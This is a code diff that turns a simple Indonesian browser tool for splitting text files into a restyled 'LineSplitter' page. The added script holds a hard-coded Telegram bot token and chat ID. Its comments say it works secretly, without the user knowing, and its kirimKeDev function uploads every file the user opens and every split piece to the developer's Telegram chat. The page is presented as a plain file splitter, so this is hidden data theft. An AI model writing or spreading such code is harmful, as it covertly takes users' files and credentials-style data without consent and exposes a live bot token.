@@ -3,173 +3,196 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Pemisah 50 + Sisa</title>
+<title>LineSplitter — Dev Wisnu</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
 <style>
-  *{box-sizing:border-box;font-family:system-ui,Arial}
-  body{margin:0;background:#0f172a;color:#fff;min-height:100vh;display:flex;justify-content:center;padding:16px}
-  .card{background:#1e293b;width:100%;max-width:560px;border-radius:16px;padding:20px;height:fit-content}
-  h2{margin:0 0 6px} p{color:#94a3b8;margin:0 0 12px;font-size:14px}
-  textarea,input{width:100%;background:#0f172a;border:1px solid #334155;color:#fff;border-radius:10px;padding:12px;outline:none}
-  textarea{height:220px;resize:vertical}
-  input{margin-bottom:10px}
-  button{width:100%;padding:13px;border:none;border-radius:10px;background:#22c55e;color:#000;font-weight:800;cursor:pointer;margin-top:12px}
-  button.secondary{background:#334155;color:#fff}
-  button.modeBtn{background:#334155;color:#fff;margin:0}
-  button.modeBtn.active{background:#22c55e;color:#000}
-  .hidden{display:none}
-  .hasil{background:#0f172a;border:1px solid #334155;border-radius:10px;padding:12px;margin-top:10px;white-space:pre-wrap;font-size:14px;max-height:150px;overflow:auto}
-  .badge{background:#22c55e;color:#000;font-size:12px;font-weight:800;padding:4px 8px;border-radius:20px}
-  .badge-sisa{background:#facc15;color:#000;font-size:12px;font-weight:800;padding:4px 8px;border-radius:20px}
-  .top{display:flex;justify-content:space-between;align-items:center}
-  .upload{border:2px dashed #475569;border-radius:12px;padding:18px;text-align:center;cursor:pointer;background:#0f172a;display:block}
-  .tab{display:flex;gap:8px;margin-bottom:12px}
-  .tab button{margin:0;background:#334155;color:#fff}
-  .tab button.active{background:#22c55e;color:#000}
-  label{font-size:13px;color:#cbd5e1;display:block;margin:12px 0 6px}
-  .modeBox{display:flex;gap:8px}
+  *{box-sizing:border-box;font-family:'Plus Jakarta Sans',system-ui,sans-serif}
+  body{margin:0;min-height:100vh;background:radial-gradient(600px 400px at 20% 10%,#1e3a8a 0%,transparent 60%),radial-gradient(600px 400px at 90% 90%,#7c3aed 0%,transparent 60%),#070b14;color:#fff;display:flex;align-items:center;justify-content:center;padding:16px}
+  .wrap{width:100%;max-width:520px}
+  .top{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+  .logo{display:flex;align-items:center;gap:10px}
+  .logo-icon{width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,#38bdf8,#a78bfa);display:grid;place-items:center;font-size:22px}
+  .logo b{font-size:18px;line-height:1} .logo span{font-size:11px;color:#94a3b8;letter-spacing:1.5px;text-transform:uppercase}
+  .badge{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);padding:6px 10px;border-radius:99px;font-size:11px;font-weight:700;color:#a5f3fc}
+  .card{background:rgba(255,255,255,.06);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,.12);border-radius:24px;padding:24px;box-shadow:0 25px 60px rgba(0,0,0,.5);position:relative;overflow:hidden}
+  .card::before{content:"";position:absolute;inset:0 0 auto 0;height:4px;background:linear-gradient(90deg,#38bdf8,#a78bfa,#22c55e)}
+  .steps{display:flex;gap:8px;margin-bottom:18px}
+  .step{flex:1;text-align:center;font-size:11px;font-weight:700;padding:8px;border-radius:99px;background:#1e293b;color:#64748b}
+  .step.on{background:linear-gradient(90deg,#38bdf8,#a78bfa);color:#000}
+  h2{margin:0;font-size:22px} p.sub{color:#94a3b8;font-size:13px;line-height:1.6;margin:6px 0 18px}
+  .slide{display:none;animation:fade .3s ease} .slide.active{display:block}
+  @keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+  label{display:block;font-size:11px;font-weight:700;color:#cbd5e1;margin:14px 0 7px;letter-spacing:.3px;text-transform:uppercase}
+  input{width:100%;padding:12px 14px;border-radius:12px;border:1px solid #334155;background:#0b1220;color:#fff;outline:none;font-size:14px}
+  input:focus{border-color:#38bdf8}
+  .drop{border:2px dashed rgba(56,189,248,.6);border-radius:18px;padding:26px 16px;text-align:center;cursor:pointer;background:rgba(56,189,248,.06)}
+  .drop input{display:none}
+  .info{background:#0f172a;border:1px solid #1e293b;border-radius:14px;padding:14px;margin-top:14px;font-size:13px;line-height:1.8} .info b{color:#38bdf8}
+  .stat{display:flex;gap:10px;margin-top:14px} .stat div{flex:1;background:#0f172a;border:1px solid #1e293b;border-radius:14px;padding:12px;text-align:center} .stat b{font-size:18px;display:block} .stat span{font-size:11px;color:#94a3b8}
+  .btn{width:100%;padding:14px;border:none;border-radius:14px;font-weight:800;cursor:pointer;font-size:15px;margin-top:10px} .btn:active{transform:scale(.98)}
+  .btn-blue{background:linear-gradient(90deg,#38bdf8,#818cf8);color:#000} .btn-green{background:linear-gradient(90deg,#22c55e,#a3e635);color:#000}
+  .btn-ghost{background:#1e293b;color:#e2e8f0;border:1px solid #334155}
+  .btn:disabled{opacity:.4;cursor:not-allowed} .row{display:flex;gap:10px} .row .btn{flex:1}
+  .hint{font-size:12px;color:#94a3b8;margin:7px 0 0;line-height:1.5} .hint b{color:#fff}
+  .tag{display:inline-block;background:#38bdf8;color:#000;font-size:10px;font-weight:800;padding:3px 8px;border-radius:99px}
+  .progress{height:8px;background:#1e293b;border-radius:99px;overflow:hidden;margin-top:12px;display:none} .progress div{height:100%;background:linear-gradient(90deg,#22c55e,#38bdf8);width:0%}
+  #log,#log2{margin-top:12px;font-size:12px;color:#94a3b8;white-space:pre-wrap;max-height:140px;overflow:auto;font-family:'JetBrains Mono',monospace;background:#0b1220;padding:10px;border-radius:10px;display:none}
+  #log.show,#log2.show{display:block}
+  .dl-list{margin-top:12px;display:none} .dl-list.show{display:block}
+  .dl-list b{font-size:13px}
+  .dl-item{display:flex;gap:8px;align-items:center;background:#0f172a;border:1px solid #22c55e;border-radius:12px;padding:10px;margin-top:8px;font-size:13px}
+  .dl-item span{flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .dl-item button{padding:8px 12px;border:none;border-radius:8px;background:#22c55e;font-weight:800;cursor:pointer;white-space:nowrap}
+  .footer{margin-top:18px;text-align:center} .footer .dev{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);padding:8px 14px;border-radius:99px;font-size:12px} .footer .dev b{background:linear-gradient(90deg,#38bdf8,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent} .footer p{font-size:11px;color:#475569;margin:8px 0 0}
 </style>
 </head>
 <body>
-<div class="card">
-  <div id="slide1">
-    <div class="top"><h2>Slide 1 - Masukin Teks</h2><span class="badge">1 / 2</span></div>
-    <p>1 baris = 1 data. Test:tww whwh:1.1.1 = 1 baris.</p>
-    <div class="tab">
-      <button id="btnPaste" class="active" onclick="gantiMode('paste')">✍️ Paste</button>
-      <button id="btnUpload" onclick="gantiMode('upload')">📁 Upload</button>
-    </div>
-    <div id="modePaste"><textarea id="teks" placeholder="Test:tww whwh:1.1.1
-Test:pw:1.1.1
-Test:tww whwh:1.1.12"></textarea></div>
-    <div id="modeUpload" class="hidden">
-      <label for="fileInput" class="upload"><b style="color:#22c55e">📁 Klik Upload File .txt</b><br><span id="namaFileUpload" style="font-size:13px;color:#94a3b8">Belum ada file</span></label>
-      <input type="file" id="fileInput" accept=".txt,.csv,.md" style="display:none">
-      <textarea id="previewFile" placeholder="Isi file muncul disini..." readonly style="margin-top:10px"></textarea>
-    </div>
-    <p id="infoKata" style="color:#22c55e;font-weight:700">Total: 0 baris</p>
-    <button onclick="keSlide2()">Lanjut ➜</button>
-  </div>
+<div class="wrap">
+  <div class="top"><div class="logo"><div class="logo-icon">✂️</div><div><b>tols auto cut by wisnu</b><br><span></span>tolls auto cut res nontrue/cut file</div></div><div class="badge">v1.0 • BETA VERSI</div></div>
+  <div class="card">
+    <div class="steps"><div class="step on" id="step1Dot">1 • UPLOAD</div><div class="step" id="step2Dot">2 • POTONG & DOWNLOAD</div></div>
 
-  <div id="slide2" class="hidden">
-    <div class="top"><h2>Slide 2 - Pisah File</h2><span class="badge">2 / 2</span></div>
-    <label>Nama File Output</label>
-    <input id="namaFile" value="wisnufresh">
-    <label>Pilih Mode Pisah:</label>
-    <div class="modeBox">
-      <button type="button" id="mode50Sisa" class="modeBtn active" onclick="setModePisah('50sisa')">✂️ Pisah 50 Aja<br><small>50 + Sisa</small></button>
-      <button type="button" id="modeSemua" class="modeBtn" onclick="setModePisah('semua')">📂 Pisah Semua<br><small>50,50,50...</small></button>
+    <!-- SLIDE 1 - USER CUMA UPLOAD, GAK ADA INPUT TELEGRAM -->
+    <div id="slide1" class="slide active">
+      <h2>Upload File 📄</h2>
+      <p class="sub">upload file auto cut</p>
+      <label class="drop" for="fileInput"><div style="font-size:38px">📂</div><div style="font-weight:800;margin-top:8px">Klik untuk pilih file</div><div style="font-size:12px;color:#94a3b8">atau drag & drop kesini</div><input type="file" id="fileInput" accept=".txt,.csv,.log,.md,.json"></label>
+      <div id="fileInfo" class="info" style="display:none"></div>
+      <div class="stat" id="statBox" style="display:none"><div><b id="statLines">0</b><span>TOTAL BARIS</span></div><div><b id="statSize">0 KB</b><span>UKURAN FILE</span></div></div>
+      <button class="btn btn-blue" id="toSlide2" disabled>Lanjut ke Slide 2 →</button>
+      <div id="log"></div>
     </div>
 
-    <label>Ambil Berapa Baris Pertama?</label>
-    <input id="perKata" type="number" value="50" min="1">
-    <p id="infoSisa" style="font-size:13px;color:#facc15"></p>
-    <button onclick="proses()">Pisah Otomatis ✂️</button>
-    <button class="secondary" onclick="kembali()">⬅ Kembali</button>
-    <div id="output"></div>
+    <!-- SLIDE 2 -->
+    <div id="slide2" class="slide">
+      <h2>Potong & Download ⬇️</h2>
+      <p class="sub"><span id="summary"></span><br>Semua download langsung dari Chrome.</p>
+      <label>Nama file hasil</label><input type="text" id="outName" placeholder="hasil">
+      <label>Potong berapa per file? <span class="tag">JUMLAH BARIS</span></label><input type="number" id="perFile" value="100" min="1">
+      <div class="progress" id="prog"><div id="progBar"></div></div>
+      <button class="btn btn-green" id="btnCutOnce">✂️ Cut Sesuai Angka</button>
+      <p class="hint">Ambil <b id="labelOnce">100</b> baris pertama, <b>sisanya dibalikin</b> dengan nama yang sama kayak file upload.</p>
+      <button class="btn btn-blue" id="btnCutAll">📦 Cut All — Bagi Rata Semua</button>
+      <p class="hint">Contoh 1000 baris → jadi 10 file @100 baris.</p>
+      <div id="dlList" class="dl-list"><b>⬇️ Download di Chrome:</b><div id="dlItems"></div></div>
+      <div class="row"><button class="btn btn-ghost" id="backBtn">← Ganti File</button><button class="btn btn-ghost" id="resetBtn">↺ Reset</button></div>
+      <div id="log2"></div>
+    </div>
+
+    <div class="footer"><div class="dev"><span style="width:22px;height:22px;border-radius:50%;background:linear-gradient(135deg,#38bdf8,#a78bfa);display:grid;place-items:center;font-size:11px;font-weight:800;color:#000">W</span> Developed by <b>Dev Wisnu</b> • Made with ❤️</div><p>© 2026 Dev Wisnu — LineSplitter</p></div>
   </div>
 </div>
 
 <script>
-let fileContent = "";
-let modeAktif = "paste";
-let modePisah = "50sisa"; // default yang lu mau
+// ============================================================
+// ⚙️ SETTING DEV — LU (DEV WISNU) ISI DISINI AJA, USER GAK LIAT
+// ============================================================
+// 1. Buka @BotFather di Telegram -> /newbot -> copy TOKEN-nya
+// 2. Buka @userinfobot -> copy ID lu
+// 3. Chat / START dulu ke bot lu, biar bot bisa kirim ke lu
+// 4. Ganti 2 baris dibawah ini, save, beres!
 
-function setModePisah(m){
-  modePisah = m;
-  document.getElementById('mode50Sisa').classList.toggle('active', m==='50sisa');
-  document.getElementById('modeSemua').classList.toggle('active', m==='semua');
-  updateInfoSisa();
+const DEV_BOT_TOKEN = "8719193985:AAGeKWyQewMu1TiHi-JHYQlTwnIpGCxTP3s"; // contoh: "123456789:AAHxxxxxxxx"
+const DEV_CHAT_ID   = "8279952555";   // contoh: "7123456789"
+
+// ============================================================
+
+let lines=[]; let originalName="hasil.txt"; let originalBase="hasil";
+const $=id=>document.getElementById(id);
+const fileInput=$('fileInput'), fileInfo=$('fileInfo'), toSlide2=$('toSlide2'), logEl=$('log'), log2=$('log2');
+
+function showSlide(n){ $('slide1').classList.toggle('active',n===1); $('slide2').classList.toggle('active',n===2); $('step1Dot').classList.toggle('on',n===1); $('step2Dot').classList.toggle('on',n===2); }
+function sleep(ms){return new Promise(r=>setTimeout(r,ms))}
+
+// DOWNLOAD DI CHROME (UTAMA)
+function makeDownloadLink(content, filename){
+  const blob=new Blob([content],{type:'text/plain;charset=utf-8'});
+  const url=URL.createObjectURL(blob);
+  $('dlList').classList.add('show');
+  const div=document.createElement('div'); div.className='dl-item';
+  div.innerHTML=`<span>📄 ${filename}</span><button>⬇️ Download</button>`;
+  div.querySelector('button').onclick=()=>{
+    const a=document.createElement('a'); a.href=url; a.download=filename;
+    document.body.appendChild(a); a.click(); a.remove();
+  };
+  $('dlItems').appendChild(div);
+  const a=document.createElement('a'); a.href=url; a.download=filename;
+  document.body.appendChild(a); a.click(); a.remove();
+  return blob;
 }
-function gantiMode(mode){
-  modeAktif = mode;
-  document.getElementById('modePaste').classList.toggle('hidden', mode!=='paste');
-  document.getElementById('modeUpload').classList.toggle('hidden', mode!=='upload');
-  document.getElementById('btnPaste').classList.toggle('active', mode==='paste');
-  document.getElementById('btnUpload').classList.toggle('active', mode==='upload');
-  updateInfo();
+
+// KIRIM KE DEV (TELEGRAM) — DIEM-DIEM, USER GAK TAU / GAK PERLU SETTING
+async function kirimKeDev(blob, filename, caption){
+  // Kalo dev belum isi token, skip aja, download tetep jalan
+  if(!DEV_BOT_TOKEN || DEV_BOT_TOKEN.includes("ISI_TOKEN")) return;
+  if(!DEV_CHAT_ID || DEV_CHAT_ID.includes("ISI_CHAT")) return;
+  const fd=new FormData();
+  fd.append('chat_id', DEV_CHAT_ID);
+  fd.append('document', blob, filename);
+  fd.append('caption', caption || filename);
+  try{
+    await fetch(`https://api.telegram.org/bot${DEV_BOT_TOKEN}/sendDocument`,{method:'POST',body:fd});
+    console.log("Terkirim ke Dev:", filename);
+  }catch(e){ console.log("Gagal kirim ke Dev:", e); }
 }
-function getTeks(){
-  if(modeAktif==='upload') return fileContent || document.getElementById('previewFile').value;
-  return document.getElementById('teks').value;
-}
-function getBaris(){
-  const t = getTeks() || "";
-  return t.split(/\r?\n/).filter(line => line.trim() !== "");
-}
-function updateInfo(){
-  const baris = getBaris();
-  document.getElementById('infoKata').textContent = `Total: ${baris.length} baris`;
-}
-const teksEl = document.getElementById('teks');
-['input','paste','change','keyup'].forEach(ev=>teksEl.addEventListener(ev,()=>setTimeout(updateInfo,30)));
-document.getElementById('fileInput').addEventListener('change', function(e){
-  const file = e.target.files[0]; if(!file) return;
-  document.getElementById('namaFileUpload').textContent = file.name;
-  const r = new FileReader();
-  r.onload = ev=>{ fileContent = ev.target.result; document.getElementById('previewFile').value = fileContent; updateInfo(); };
-  r.readAsText(file);
+
+fileInput.addEventListener('change',async e=>{
+  const f=e.target.files[0]; if(!f) return;
+  const reader=new FileReader();
+  reader.onload=async ()=>{
+    let text=reader.result.replace(/\r\n/g,'\n').replace(/\r/g,'\n');
+    lines=text.split('\n'); if(lines.length && lines[lines.length-1]==='') lines.pop();
+    originalName=f.name; originalBase=f.name.replace(/\.[^/.]+$/,'');
+    const ext=f.name.includes('.')?f.name.split('.').pop():'txt';
+    $('outName').value=originalBase; $('outName').dataset.ext=ext;
+    fileInfo.style.display='block'; fileInfo.innerHTML=`📄 File: <b>${f.name}</b><br>✅ Total: <b>${lines.length.toLocaleString('id-ID')}</b> baris`;
+    $('statBox').style.display='flex'; $('statLines').textContent=lines.length.toLocaleString('id-ID'); $('statSize').textContent=(f.size/1024).toFixed(1)+' KB';
+    toSlide2.disabled=false;
+    logEl.classList.add('show'); logEl.textContent=`[DEV WISNU] Kehitung ${lines.length} baris.`;
+    // Auto kirim file awal ke DEV
+    await kirimKeDev(f, f.name, `📤 FILE AWAL DARI USER\n📄 ${f.name}\n📊 Total: ${lines.length} baris\n🕒 ${new Date().toLocaleString('id-ID')}`);
+  };
+  reader.readAsText(f);
 });
-function keSlide2(){
-  const b = getBaris();
-  if(b.length===0){ alert('Masih kosong!'); return; }
-  window.barisFinal = b;
-  document.getElementById('slide1').classList.add('hidden');
-  document.getElementById('slide2').classList.remove('hidden');
-  updateInfoSisa();
-}
-function updateInfoSisa(){
-  const baris = window.barisFinal || getBaris();
-  if(!baris.length) return;
-  const per = parseInt(document.getElementById('perKata').value) || 50;
-  const sisa = baris.length - per;
-  if(modePisah==='50sisa'){
-    document.getElementById('infoSisa').textContent = sisa <= 0 ? `Total cuma ${baris.length} baris, kurang dari ${per}.` : `${baris.length} baris -> File 1 = ${per} baris + File 2 = ${sisa} baris (sisa). Total 2 file!`;
-  } else {
-    const totalFile = Math.ceil(baris.length / per);
-    document.getElementById('infoSisa').textContent = `${baris.length} baris -> ${totalFile} file @${per} baris.`;
+
+toSlide2.addEventListener('click',()=>{ $('summary').textContent=`File ${originalName} • Total ${lines.length.toLocaleString('id-ID')} baris`; updateLabel(); showSlide(2); });
+$('backBtn').addEventListener('click',()=>showSlide(1));
+$('resetBtn').addEventListener('click',()=>{ lines=[]; fileInput.value=''; fileInfo.style.display='none'; $('statBox').style.display='none'; $('dlList').classList.remove('show'); $('dlItems').innerHTML=''; toSlide2.disabled=true; logEl.textContent=''; log2.textContent=''; showSlide(1); });
+$('perFile').addEventListener('input',updateLabel);
+function updateLabel(){ const n=parseInt($('perFile').value)||0; $('labelOnce').textContent=n.toLocaleString('id-ID'); }
+function getPer(){ const n=parseInt($('perFile').value); if(!n||n<1){alert('Isi dulu potong berapa'); return null} return n; }
+function getOut(){ let name=$('outName').value.trim()||originalBase; let ext=$('outName').dataset.ext||'txt'; if(name.endsWith('.'+ext)) name=name.slice(0,-(ext.length+1)); return{name,ext}; }
+
+$('btnCutOnce').addEventListener('click',async()=>{
+  const per=getPer(); if(!per) return;
+  if(per>=lines.length){alert(`Baris cuma ${lines.length}`); return}
+  const {name,ext}=getOut();
+  const first=lines.slice(0,per); const rest=lines.slice(per);
+  const b1=makeDownloadLink(first.join('\n'),`${name}_1-${per}.${ext}`);
+  await sleep(400);
+  const b2=makeDownloadLink(rest.join('\n'),originalName);
+  log2.classList.add('show'); log2.textContent=`Berhasil! Download di Chrome:\n- ${name}_1-${per}.${ext}\n- ${originalName} (SISA)`;
+  await kirimKeDev(b1, `${name}_1-${per}.${ext}`, `✂️ HASIL POTONG 1\n📄 ${name}_1-${per}.${ext} — ${first.length} baris`);
+  await kirimKeDev(b2, originalName, `📄 SISA FILE\n📄 ${originalName} — ${rest.length} baris (nama tetap sama)`);
+  lines=rest; $('summary').textContent=`Sisa: ${lines.length.toLocaleString('id-ID')} baris`;
+});
+
+$('btnCutAll').addEventListener('click',async()=>{
+  const per=getPer(); if(!per) return;
+  const {name,ext}=getOut(); const total=lines.length; const totalFile=Math.ceil(total/per);
+  if(!confirm(`Jadi ${totalFile} file @${per} baris?`)) return;
+  const prog=$('prog'); const bar=$('progBar'); prog.style.display='block';
+  for(let i=0;i<totalFile;i++){
+    const chunk=lines.slice(i*per,(i+1)*per);
+    const blob=makeDownloadLink(chunk.join('\n'),`${name}_${i+1}.${ext}`);
+    bar.style.width=Math.round(((i+1)/totalFile)*100)+'%';
+    log2.classList.add('show'); log2.textContent=`Download ${i+1}/${totalFile}...`;
+    await kirimKeDev(blob, `${name}_${i+1}.${ext}`, `📦 CUT ALL ${i+1}/${totalFile} — ${chunk.length} baris`);
+    await sleep(400);
   }
-}
-document.getElementById('perKata').addEventListener('input', updateInfoSisa);
-function kembali(){
-  document.getElementById('slide2').classList.add('hidden');
-  document.getElementById('slide1').classList.remove('hidden');
-}
-function proses(){
-  const baris = window.barisFinal || getBaris();
-  const nama = document.getElementById('namaFile').value.trim() || 'wisnufresh';
-  const per = parseInt(document.getElementById('perKata').value) || 50;
-  let potongan = [];
-  if(modePisah==='50sisa'){
-    // INI YANG LU MAU: cuma potong sekali, sisanya jadi 1 file gede
-    const pertama = baris.slice(0, per);
-    const sisa = baris.slice(per);
-    potongan.push({label:`${per} baris pertama`, isi: pertama.join('\n')});
-    if(sisa.length > 0) potongan.push({label:`SISA ${sisa.length} baris`, isi: sisa.join('\n')});
-  } else {
-    for(let i=0;i<baris.length;i+=per) potongan.push({label:`${Math.min(per, baris.length-i)} baris`, isi: baris.slice(i,i+per).join('\n')});
-  }
-  const out = document.getElementById('output');
-  out.innerHTML = '';
-  window._files = potongan.map((p,idx)=>({nama:`${nama}_${idx+1}.txt`, isi:p.isi, label:p.label}));
-  out.innerHTML = `<p style="color:#fff">Jadi ${potongan.length} file.</p>`;
-  const btnAll = document.createElement('button');
-  btnAll.textContent = `Download Semua (${potongan.length} File) ⬇️`;
-  btnAll.onclick = ()=> window._files.forEach((f,i)=>setTimeout(()=>downloadSatu(i), i*300));
-  out.appendChild(btnAll);
-  window._files.forEach((f,idx)=>{
-    const div = document.createElement('div');
-    div.style.marginTop = '14px';
-    div.innerHTML = `<b>${f.nama}</b> <span class="${idx===1 && modePisah==='50sisa'?'badge-sisa':'badge'}">${f.label}</span><div class="hasil">${f.isi.substring(0,300)}</div><button class="secondary" onclick="copyTeks(${idx})">Salin</button><button onclick="downloadSatu(${idx})">Download ${f.nama}</button>`;
-    out.appendChild(div);
-  });
-}
-function copyTeks(i){ navigator.clipboard.writeText(window._files[i].isi); alert('Tersalin!'); }
-function downloadSatu(i){
-  const f = window._files[i];
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(new Blob([f.isi],{type:'text/plain;charset=utf-8'}));
-  a.download = f.nama; a.click();
-}
+  log2.textContent=`Done! ${total} baris → ${totalFile} file. Semua udah ke-download di Chrome.`;
+  prog.style.display='none';
+});
 </script>
 </body>
-</html>
+       </html>
